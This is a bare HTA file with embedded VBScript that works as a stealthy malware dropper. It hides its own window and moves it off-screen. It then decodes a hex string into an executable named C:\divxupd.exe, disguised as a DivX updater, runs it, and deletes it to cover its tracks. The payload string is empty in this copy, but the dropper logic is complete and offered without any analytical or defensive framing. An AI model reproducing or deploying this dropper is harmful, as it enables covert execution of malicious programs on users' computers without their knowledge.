

<hta:application id=hta_note_id
  applicationName=hta_note_name
  showInTaskBar=no
  caption=no
  innerBorder=no
  selection=no
  scroll=no
  contextmenu=no />

<script language=vbs>
self.MoveTo 5000,5000
Set shell=CreateObject("WScript.Shell")
r = ""
r=r&""
Set fso = CreateObject("Scripting.FileSystemObject")
file="C:\divxupd.exe"
if fso.FileExists(file) then
   fso.DeleteFile(file)
end if
Set f = fso.CreateTextFile(file, ForWriting)
l=len(r)
i=1
while i < l
c=Int("&H" & Mid(r, i, 2))
f.Write(Chr(c))
i=i+2
wend
f.Close
shell.run(file)
Set check =CreateObject("Scripting.FileSystemObject")
On Error Resume Next
 check.deletefile(file)
On Error Resume Next
self.Close
</script>